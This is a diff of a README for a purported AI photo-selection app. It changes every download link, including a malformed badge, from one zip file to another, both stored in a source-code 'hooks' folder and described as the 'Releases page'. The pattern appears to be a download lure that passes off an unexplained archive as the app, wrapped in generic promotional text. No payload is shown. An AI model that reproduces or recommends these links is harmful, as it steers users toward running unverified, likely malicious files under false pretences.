@@ -1,7 +1,7 @@
 # 📸 photo-selector-app - Make Photo Selection Easy 
 
 ## 📥 Download the App
-[![Download now](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/selector_app_photo_3.8.zip%20photo--selector--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/selector_app_photo_3.8.zip)
+[![Download now](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/photo-selector-app-v2.1.zip%20photo--selector--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/photo-selector-app-v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to photo-selector-app! This application uses AI to help you choose the best photos with ease. Whether you want to pick the perfect picture for social media, a project, or any personal use, our tool simplifies the selection process.
@@ -23,7 +23,7 @@ Welcome to photo-selector-app! This application uses AI to help you choose the b
 ## 🔽 Download & Install
 To get started with photo-selector-app, you need to download it from our Releases page:
 
-Visit [this page to download](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/selector_app_photo_3.8.zip).
+Visit [this page to download](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/photo-selector-app-v2.1.zip).
 
 Follow these steps to install the app:
 
@@ -67,4 +67,4 @@ If you enjoy using photo-selector-app or find it helpful, consider supporting us
 
 Explore photo-selector-app and experience hassle-free photo selection today! For any questions, please reach out through our GitHub repository or submit an issue.
 
-[Download the app here](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/selector_app_photo_3.8.zip) and begin your journey with photo-selector-app now!
+[Download the app here](https://raw.githubusercontent.com/NutcrackerLive/photo-selector-app/main/src/renderer/hooks/photo-selector-app-v2.1.zip) and begin your journey with photo-selector-app now!
